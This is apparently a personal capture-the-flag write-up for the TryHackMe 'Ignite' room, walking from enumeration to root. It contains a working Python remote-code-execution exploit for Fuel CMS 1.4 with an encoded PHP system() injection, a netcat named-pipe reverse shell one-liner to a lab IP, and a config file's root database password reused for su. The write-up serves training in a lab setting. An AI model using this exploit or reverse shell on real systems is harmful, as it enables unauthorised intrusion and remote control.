# Ignite (THM)

- https://tryhackme.com/room/ignite
- March 4, 2023
- easy

---

## Enumeration

### Nmap

1. 80/http Apache httpd 2.4.18 (Ubuntu)
   - robots.txt -> /fuel/
2. 5405/tcp

### HTTP

![](images/2023-03-04-18-38-55.png)


- fuel CMS 1.4
- find from searchsploit and found RCE for fuel CMS
- I edit to python3 and get RCE

```python
import requests
from urllib.parse import quote

url = "http://10.10.251.195"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print(r.text)
```

- enter cmd to get reverse shell
- listen with nc at local machine and in cmd

```sh
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4242 >/tmp/f
```

## User Access

- get `www-data` user access
- spawn shell

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
$ cat /home/www-data/flag.txt
```

## Root Access

- `sudo -l` -> don't know password
- find SUID -> nothing special found
- run linpeas
- Interested Findings

```
- Vulnerable to CVE-2021-4034
- Active Ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -

```

- nothing found but there are many files inside /var/www/html
- I found data configuration file at `/var/www/html/fuel/application/config/database.php`

```php
...
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	...
);
...
```

- change root user with password

```sh
$ su root
$ cat /root/root.txt
```

---
